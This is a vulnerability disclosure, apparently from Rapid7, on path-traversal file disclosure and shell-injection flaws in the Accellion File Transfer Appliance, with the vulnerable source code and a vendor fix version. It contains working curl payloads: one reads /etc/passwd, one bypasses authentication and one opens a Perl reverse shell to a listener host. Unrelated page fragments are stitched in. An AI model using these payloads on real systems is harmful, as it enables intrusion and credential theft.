# R7-2015-08: Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)

* Jul 10, 2015
* 4 min read
* [Tod Beardsley](/blog/author/tod-beardsley/)

*Last updated at Fri, 10 May 2019 17:15:24 GMT*

This disclosure covers two issues discovered with the [Accellion](https://www.accellion.com/) File Transfer Appliance, a device used for secure enterprise file transfers. Issue R7-2015-08.1 is a remote file disclosure vulnerability, and issue R7-2015-08.2 is remote command execution vulnerability. Metasploit modules have been released for both issues, as of [Pull Request 5694](https://github.com/rapid7/metasploit-framework/pull/5694).

According to the vendor, both issues were addressed in version FTA\_9\_11\_210, released on May 25, 2015.

## R7-2015-08.1: Accellion FTA 'statecode' Cookie Remote File Disclosure (CVE-2015-2856)

The Accellion FTA is vulnerable to a remote file disclosurevulnerability due to insufficient sanitization of the 'statecode' cookie. This cookie will be appended to a file path that is generated when PHP templates are processed. An attacker can disclose the contents of any file readable by the web server by specifying a 'statecode' cookie value consisting of "../../../../../" followed by an absolute file path and an encoded NULL byte (). The web server user account on the FTA has access to a number of sensitive files, including FTA configuration information, the MySQL root password, and any files uploaded the user if their filesystem path is known. Note that while uploaded use randomized file IDs, the path names are semi-predictable and the entire path can be brute forces given enough time.

This issue is present on version FTA\_9\_11\_200 and likely all versions prior to this release as well.

### Details

The source of this vulnerability appears to be the template() function inside function.inc:

```
 $branding_path = "custom_template/{$g_app_id}/";
    if ( $_COOKIE['statecode'] )
    {
        $branding_path .= $_COOKIE['statecode']."/";
    }
    // <snip>
    if ( $fd = @fopen( $branding_path.$t_file, "r" ) )
    {
        $t_file = $branding_path.$t_file;

```

This vulnerability may also exist in the template\_goto() function inside wm\_ui.inc, however this route has not been verified.

### Proof of Concept

An attacker can exploit this vulnerability using the standard curl utility:

```
$ curl -b 'statecode=../../../../../etc/passwd%00' -i https://<fta>/courier/intermediate_login.html

```

In addition, a Metasploit module has been released, [accellion\_fta\_statecode\_file\_read.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/accellion_fta_statecode_file_read.rb)

## R7-2015-08.2: Accellion FTA 'oauth\_token' Remote Command Execution (CVE-2015-2857)

The Accellion FTA is vulnerable to a remote command execution vulnerability due to insufficient sanitization of the 'oauth\_token' parameter. This parameter is passed into a system() command line through multiple mod\_perl handlers. Although code execution occurs as the web user (nobody), this account has nearly complete access to the appliance due to how file permissions are configured by default. For example, the MySQL database password is stored in /home/filex1/db and this datasbase contains usernames, password hashes, LDAP credentials, event logs, and information about uploaded files. The web user also has access to all files uploaded to the appliance.

This issue is present on version FTA\_9\_11\_200 and likely all versions prior to this release as well.

### Details

This vulnerability is present in 3 places within `/home/seos/api/Md/Utils.pm`, detailed below

The `get_oauth_customer_name()` function is called by the twsPut, Find, Put, and mPut handlers and passes an `oauth_token` directly to the command line.

```
sub get_oauth_customer_name
{
  my ($aid, $token) = @_;

  # SOAP Lite cannot work with mod perl? Call external script
  my $customer_name = `/opt/bin/perl /home/seos/system/call_webservice.pl $aid oauth_ws.php get_consumer_name '$token'`;
  return $customer_name;
  # ...
}

```

The `verify_oauth_token()` function is called by the twsPut, twssetStatus, twsGet, twsgetStatus, Find, Put, and mPut handlers and passes an `oauth_token` directly to the command line.

```
sub verify_oauth_token
{
  my ($aid, $token, $scope) = @_;

  # SOAP Lite cannot work with mod perl? Call external script
  my $client_id = `/opt/bin/perl /home/seos/system/call_webservice.pl $aid oauth_ws.php verify_access_token '$token' '$scope'`;
  return $client_id || 0;
}

```

The `gc_oauth_file_access()` function is called by the ckdf::AuthHandler, but this is unlikely to be exploitable, as email addresses are sanitized elsewhere first, and the call is made post authentication.

```
sub gc_oauth_file_access
{
  my ($aid, $user_email, $gc_fid) = @_;

  my $result = `/opt/bin/perl /home/seos/system/call_webservice.pl $aid sclient_user_ws.php gc_oauth_file_access '$user_email' '$gc_fid'`;
  return $result =~ /^1$/ ? 1 : 0;
}

```
### Proof of Concept

An attacker can exploit this vulnerability via the `/tws/getStatus` URL using the standard curl utility.

The first example abuses this vulnerability in order to bypass authentication:

```
$ curl -k -XPOST -d "transaction_id=1&oauth_token='%3becho '" https://<fta>/tws/getStatus
{"loc_id":"8888","result_code":"0","result_msg":"Success","transaction_id":"1","version":"0.18"}

```

The second example abuses this vulnerability in order to return a command shell to 192.168.0.3:4444:

```
# Open a netcat listener on port 4444 from one terminal
$ nc -l 4444

# Send our exploit request from a second terminal
$ curl -k -XPOST -d "transaction_id=1&oauth_token=%27%3bperl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3bforeach%20my%20%24key%28keys%20%25ENV%29%7bif%28%24ENV%7b%24key%7d%3d~/%28.%2a%29/%29%7b%24ENV%7b%24key%7d%3d%241%3b%7d%7d%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22192.168.0.3%3a4444%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24~-%3efdopen%28%24c%2cw%29%3bwhile%28%3c%3e%29%7bif%28%24_%3d~%20/%28.%2a%29/%29%7bsystem%20%241%3b%7d%7d%3b%27%3becho%20%27" https://<fta>/tws/getStatus
{"loc_id":"8888","result_code":"0","result_msg":"Success","transaction_id":"1","version":"0.18"}

# Interact with our shell
Connection from [fta] port 4444 [tcp/*] accepted (family 2, sport 48025)

```

In addition, a Metasploit module has been released, [accellion\_fta\_getstatus\_oauth.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/accellion_fta_getstatus_oauth.rb).

          This module exploits a metacharacter shell injection vulnerability in the Accellion
        File Transfer appliance. This vulnerability is triggered when a user-provided
        'oauth_token' is passed into a system() call within a mod_perl handler. This
        module exploits the '/tws/getStatus' endpoint. Other vulnerable handlers include
        '/seos/find.api', '/seos/put.api', and /seos/mput.api'. This issue was confirmed on
        version FTA_9_11_200, but may apply to previous versions as well. This issue was

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

### Accellion FTA getStatus verify\_oauth\_token Command Execution

Disclosed
07/10/2015

Created
05/30/2018

#### Description

This module exploits a metacharacter shell injection vulnerability in the Accellion
File Transfer appliance. This vulnerability is triggered when a user-provided
'oauth\_token' is passed into a system() call within a mod\_perl handler. This
module exploits the '/tws/getStatus' endpoint. Other vulnerable handlers include
'/seos/find.api', '/seos/put.api', and /seos/mput.api'. This issue was confirmed on
version FTA\_9\_11\_200, but may apply to previous versions as well. This issue was
fixed in software update FTA\_9\_11\_210.

Time is precious, so I don’t want to do something manually that I can automate. Leveraging the Metasploit Framework when automating any task keeps us from having to re-create the wheel as we can use the existing libraries and focus our efforts where it matters.
